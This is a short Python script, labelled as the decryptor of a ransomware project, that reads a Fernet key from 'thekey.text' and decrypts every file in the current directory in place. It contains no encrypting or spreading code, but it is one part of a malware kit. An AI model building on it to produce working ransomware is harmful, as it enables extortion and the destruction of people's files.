import os
from cryptography.fernet import Fernet

#decryptor
#ransomware
files = []

#decrypt every file in the current directory
for file in os.listdir():
    if file=="RPSMalware.py" or file=="thekey.text" or file=="decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
key=""
with open("thekey.text","rb") as thekey:
    key=thekey.read()
for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_decrypted = Fernet(key).decrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_decrypted)
